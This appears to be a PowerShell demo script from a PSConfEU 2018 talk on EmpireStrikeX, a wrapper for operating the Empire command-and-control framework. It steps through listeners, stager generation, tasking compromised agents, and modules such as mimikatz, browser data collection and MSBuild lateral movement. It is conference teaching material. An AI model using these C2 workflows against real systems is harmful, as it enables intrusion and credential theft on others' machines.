Write-Warning 'Not a Script... Dont <F5> me again...';Break
###########################################################
##            EMPIRESTRIKE - PSConfEU 2018               ##
###########################################################

###########################################################

# EmpireStrikeX Source
start-process https://github.com/SadProcessor/SomeStuff/blob/master/EmpireStrikeX.ps1



########################################################### EmpireStrike - Cmdlets

## View all Empire Commands
Empire-Help
Empire



###########################################################
## Set  Vars 
# Server IPs
$Empire1  = "10.7.23.169"
$Empire2  = "10.7.23.176"
$Listener = 'http'


#region ############################################# ADMIN

## Login
Empire-Admin -Login -Server $Empire1 -User sadprocessor -Port 1337 -NoSSL
server -X $Empire2 sadprocessor -NoSSL 


## Info 
Admin -Token
Admin -Version
Admin -Config
Admin -Config | Select staging_key

## File (in static folder at root of empire)
Admin -ID 0 -file staticFile.txt
admin -file ASCIIArt.txt

## Restart/Shutdown Empire
Admin -Restart                          <# /!\: Does not restart REST API :/!\ #>
Admin -ShutDown
#Admin -ShutDown -Confirm:$False

## REST API Map
Admin -Map

start-Process https://github.com/SadProcessor/Cheats/blob/master/EmpireAPI.md


## Examples
Help Admin -Examples
#endregion ################################################ 



#region ########################################### SESSION

## List all
Empire-Session -List
Session -list
Ses -list

## View Current/Specific
Session -view
Session -View 0

## Set as current session
Session -Target 0

## Sync all session obj (shouldn't need to)
Session -Sync

## New Session (same as admin login)
Session -new -Server $Empire0 -User sadprocessor -NoSSL

## Remove session
Session -Remove 2

Session -Target 0


## Examples
Help session -Examples
#endregion ################################################



#region ########################################## LISTENER

## List all
Listener -list

## Create listener
Listener -Use $Listener
Listener -option
#Listener -Option Name bob
Listener -Execute 

## View existing listener
Listener -View $Listener
Listener -View $Listener | select -expand options
Listener -View $Listener | Unpack

## Kill 
Listener -Kill $Listener


## Examples
Help Listener -Examples
#endregion ################################################



#region ############################################ STAGER

## List all stager type
Stager -List

## Generate Stager
Stager -Use multi/launcher
Stager -Option Listener $Listener
Stager -Generate

Stager -Generate -ToClipboard

## Examples
Help Stager -Examples
#endregion ################################################



#region ############################################# AGENT

## List all agents in session (+sync cache)
Agent -List
Agent -ListStale
Agent -RemoveStale

$Agent = (Agent -list)[0].name

## View specific agent
Agent -View $Agent

## Select Agent as default target
Agent -Target $Agent
Target $Agent

## Exec command
agent $Agent -exec -Command get-date

## Kill Agent
#Agent -Kill $Agent


## Examples
Help Agent -Examples
#endregion ################################################



#region ############################################ TARGET

## View Current Target
Target

## Switch Session
Target -Session 0

## Set Target Agent
Target $Agent

# Examples
Help Target -Examples
#endregion ################################################



#region ############################################## EXEC

## Default Target
Exec get-date

# Specific target
Exec get-date -Name $Agent

# Multi target
Agent -list | Exec get-date -Blind
Agent -list | Result

# Objects!!
$Obj = Exec "Get-Date|select *" -Json
$Obj.year
$Obj|gm
# even better...
[datetime]$Obj.Ticks | gm


#Examples
Help Exec -Examples
#endregion ################################################



#region ############################################ SEARCH

## Modules
Search power troll
Search mimikatz | select name
Search dll | Select Name
Search -Description dll | Select Name
Search -Comment monday | select Name,author
Search -Author harmj0y | measure

## Agent
Search -User sadproc | fl
Search -Computer two


## Examples
Help Search -Examples
#endregion ################################################



#region ############################################# MODUL

## View module
Empire-Module PowerShell trollsploit rick_astley

## /!\ cannot use alias 'Module'
Mod PowerShell collection browser_data | unpack
Mod PowerShell lateral_movement invoke_executemsbuild | unpack

## List all modules
Mod -list


##Examples
Help Mod -Examples
#endregion ################################################



#region ############################################ OPTION

## Select Module
Mod PowerShell custom kingpong -use

## View Options
option
## Set options
option Count
option Count 2


## Examples
Help option -Examples
#endregion ################################################



#region ############################################ STRIKE

## View Strike Options
Strike

## Launch Strike
Strike -x -Blind

# Multi Strike
Agent -List | Strike -x -Blind


## Examples
Help Strike -Examples
#endregion ################################################



#region ############################################ SNIPER

## one lines (as txt incl vars)
$Env:COMPUTERNAME

## Also
$Greeting = 'HelloWorld'
## Works
$Location = 'PSConfEU 2018'
## Multiline
Return "$Greeting from $Env:ComputerName at $Location"


### From prompt

# Curent target
Sniper 325 $Agent
xxx 327,333


Agent -list | xxx 329,335 -blind
Agent -list | Result | only results


## Examples
Help Sniper -Examples
#endregion ################################################



#region ############################################ RESULT

## View result(s) - current target
result
result -list

## View result(s) - Specific agent
result $Agent -list
result $Agent

## View result(s) - Specific agent
Agent -list | result
Agent -list | result -List


## Examples
Help result -Examples
#endregion ################################################



#region ############################################# EVENT

# /!\ Specify event type for server side filtering
# /!\ Upcoming changes in reporting /?\/?\

## last 3 tasks
Event -type task | select -last 3

## Result - specified agent
Event -Type result | where agentname -match $Agent

## Checkin - last 12hours
Event -Type checkin | ? {[Datetime]$_.timestamp -gt (Get-date).AddHours(-12)}

# Examples
Help Event -Examples
#endregion ################################################


# And more...

###########################################################
####################################################### EOF